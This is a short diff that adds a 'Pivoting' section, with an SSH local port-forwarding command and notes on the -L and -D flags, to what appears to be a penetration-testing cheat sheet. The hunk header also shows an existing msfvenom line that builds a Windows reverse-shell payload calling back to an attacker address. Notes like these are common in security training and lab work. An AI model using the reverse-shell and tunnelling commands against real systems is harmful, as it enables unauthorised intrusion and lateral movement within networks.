@@ -564,3 +564,19 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.205.128 LPORT=4444 EXITFUNC=
 
 **if require more information than refer the keepnote
 
+
+
+# Pivoting
+
+
+## Pivoting using SSH and Proxychains
+
+```
+ssh -L 8000:<webserver_address>:80 user@<ipaddress> -fN
+```
+
+Port Forwarding `-L`
+Proxies `-D`
+
+
+
